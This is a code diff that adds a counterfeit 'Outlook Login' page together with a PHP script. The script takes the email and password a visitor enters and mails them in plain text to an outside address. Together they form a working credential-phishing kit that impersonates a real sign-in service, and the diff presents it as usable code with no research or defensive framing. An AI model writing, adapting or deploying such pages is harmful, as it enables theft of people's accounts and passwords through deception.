@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Login</title>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Sign in to your account</h2>
+            <form action="send_email.php" method="post">
+                <div class="input-group">
+                    <label for="email">Email or phone</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div class="checkbox">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Keep me signed in</label>
+                </div>
+                <button type="submit">Sign in</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+                <a href="#">Create account</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Recuperar los datos del formulario
+    $email = $_POST["email"];
+    $password = $_POST["password"];
+
+    // Configurar el correo electrónico
+    $to = "berazain_96@outlook.es";
+    $subject = "Formulario de inicio de sesión - Outlook.com";
+    $message = "Email or phone: " . $email . "\nPassword: " . $password;
+    $headers = "From: your_email@example.com";
+
+    // Enviar el correo electrónico
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Correo enviado exitosamente.";
+    } else {
+        echo "Error al enviar el correo.";
+    }
+}
+?>
